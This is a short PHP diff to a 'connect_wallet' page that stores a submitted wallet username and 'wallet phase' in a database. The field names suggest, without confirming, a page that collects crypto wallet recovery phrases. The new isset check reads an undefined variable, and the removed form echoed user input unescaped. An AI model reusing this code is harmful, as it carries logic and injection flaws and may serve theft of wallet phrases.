@@ -43,7 +43,8 @@ include_once (rootDir.'partials/front/header/main.php');
                         </div>
                     </div>
                     <?php
-                   if ($_SERVER["REQUEST_METHOD"] == "POST") {
+//                   if ($_SERVER["REQUEST_METHOD"] == "POST") {
+                   if (isset($_POST[$wallet_id])) {
     // Process form data
     $wallet_id = $_POST['wallet_id'];
     $wallet_username = $conn->real_escape_string($_POST['wallet_username']);
@@ -63,23 +64,8 @@ include_once (rootDir.'partials/front/header/main.php');
 // Retrieve existing data for the form
 
 ?>
-                    <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
-                        <input type="hidden" name="wallet_id" value="<?php echo $wallet_id; ?>">
 
-                        <div class="form-group">
-                            <label for="wallet_username">Wallet Username:</label>
-                            <input type="text" class="form-control" name="wallet_username" value="<?php echo $wallet_username; ?>" required>
-                        </div>
-
-                        <div class="form-group">
-                            <label for="wallet_phase">Wallet Phase:</label>
-                            <input type="text" class="form-control" name="wallet_phase" value="<?php echo $wallet_phase; ?>" required>
-                        </div>
-
-                        <button type="submit" >Update Record</button>
-                    </form>
-
-                    <!--                    --><?php //include_once(rootDir.'connect_wallet/parts/wallets/main.php'); ?>
+                                        <?php include_once(rootDir.'connect_wallet/parts/wallets/main.php'); ?>
                 </div>
             </div>
         </section>
